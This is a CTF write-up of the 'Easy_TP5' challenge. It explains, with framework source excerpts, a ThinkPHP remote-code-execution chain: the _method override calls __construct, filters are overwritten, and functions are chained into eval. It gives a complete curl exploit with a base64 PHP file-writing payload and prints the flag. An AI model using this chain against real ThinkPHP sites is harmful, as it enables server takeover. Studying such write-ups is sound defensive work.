# Easy_TP5

A web challenge with thinkphp framework ended up having 11 solves

## Solution

Final exploit:

```
curl --data "path=PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ3N1cHBwLnBocCcsJ3N1cGVyIGd1ZXNzc3NlcnMnKTsgPz4=&_method=__construct&filter[]=set_error_handler&filter[]=self::path&filter[]=base64_decode&filter[]=\think\view\driver\Php::Display&method=GET" "http://101.32.184.39/?s=captcha&g=implode"
```

This exploit create file names `suppp.php` with `super guessssers` inside it.

## explanation

## First step
Well The challenge had many steps so i just explain how the exploit works. Everything starts from this function in `Request.php`

```
public function method($method = false)
    {
        if (true === $method) {
            return IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
        } elseif (!$this->method) {
            if (isset($_POST[Config::get('var_method')])) {
                $this->method = strtoupper($_POST[Config::get('var_method')]);
                $this->{$this->method}($_POST);
            } elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) {
                $this->method = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']);
            } else {
                $this->method = IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
            }
        }
        return $this->method;
    }

```

And this part

```
if (isset($_POST[Config::get('var_method')])) {
      $this->method = strtoupper($_POST[Config::get('var_method')]);
      $this->{$this->method}($_POST);
}
```

Accoring to `config.php` the `var_method` is set to `_method` it means that we can call any method with `$_POST` as argument.

In our exploit, The `_method`'s value in post parameters is ``__construct``.

## Second step

`__constructor` method of `Request.php` is

```
public function __construct($options = []){
        foreach ($options as $name => $item) {
            if (property_exists($this, $name)) {
                $this->$name = $item;
            }
        }
        if (is_null($this->filter)) {
            $this->filter = Config::get('default_filter');
        }
}
```

In the exploit, The `__construct` method is called with `$_POST` as arg so `$options` here is `$_POST`.

So we can overwrite any object's property to arbitrary value.

In the exploit we overwrite

```
path => "payload"
_method => "__construct"
filter => ["set_error_handler","self::path","base64_decode","\think\view\driver\Php::Display"]
method => "GET"
```

## Third step

Now the code continues until this code in `input` method

```
if (is_array($data)) {
     array_walk_recursive($data, [$this, 'filterValue'], $filter);
     reset($data);
} 
```

where `array_walk_recursive` calls `filterValue` method with following args in first call.

```
&$value   -> implode
$key      -> key of array - not important
$filters  -> ["set_error_handler","self::path","base64_decode","\think\view\driver\Php::Display"]

``` 

In `filterValue` we have

```
private function filterValue(&$value, $key, $filters)
    {
        $default = array_pop($filters);
        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                $value = call_user_func($filter, $value);
            } elseif (is_scalar($value)) {
                if (strpos($filter, '/')) {
                    if (!preg_match($filter, $value)) {          
                        $value = $default;
                        break;
                    }
                } elseif (!empty($filter)) {
                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                    if (false === $value) {
                        $value = $default;
                        break;
                    }
                }
            }
        }
        return $this->filterExp($value);
    }
```

This part is important:

```
foreach ($filters as $filter) {
            if (is_callable($filter)) {
                $value = call_user_func($filter, $value);
            }
```

It calls each filter, with previous function's return value. We can call arbitrary function with arbitrary arg But it's so limited with disabled functions and arguments count limitation. So now we need to chains function ( ROP :P ).

Our main gadget is `display` method in `think\view\driver\Php`.

Which is

```
 public function display($content, $data = [])
    {
        if (isset($data['content'])) {
            $__content__ = $content;
            extract($data, EXTR_OVERWRITE);
            eval('?>' . $__content__);
        } else {
            extract($data, EXTR_OVERWRITE);
            eval('?>' . $content);
        }
    }
```

Fortunately php supports calling non static methods ( with a warning ), But the framework has set `error_hander` to some function, so if we call non static method, we will face framework's error handler. So first we have to call `set_error_handler` with dummy function's name, here `implode`, to turn off framework's error handling. So here is my chain. 

```
function | argument ^ return value
1.
set_error_handler | "implode" ^ array
2.
self::path | The path property which we overwrited ^ base64 payload 
3.
base64_decode | base64 payload ^ decoded payload
4.
\think\view\driver\Php::Display | decoded payload

```

So now we had control over arguments, Then we used [this](https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php) payload to execute system commands, and got flag.

Flag: <b>n1ctf{ab24ad523665a581da7fd54386895f51}</b>
